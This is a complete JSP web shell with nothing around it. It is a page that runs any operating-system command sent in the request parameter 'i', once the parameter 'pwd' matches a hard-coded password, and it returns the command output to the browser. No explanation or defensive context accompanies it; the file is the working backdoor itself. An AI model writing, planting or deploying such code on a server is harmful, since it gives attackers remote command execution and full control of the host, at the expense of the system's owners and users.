<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page"  version="1.2"> 
<jsp:directive.page contentType="text/html" pageEncoding="UTF-8" /> 
<jsp:scriptlet> 
    if("sin".equals(request.getParameter("pwd"))){ 
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream(); 
        int a = -1; 
        byte[] b = new byte[2048]; 
        out.print("&lt;pre&gt;"); 
        while((a=in.read(b))!=-1){ 
            out.println(new String(b)); 
        } 
        out.print("&lt;/pre&gt;"); 
    } 
</jsp:scriptlet> 
</jsp:root>
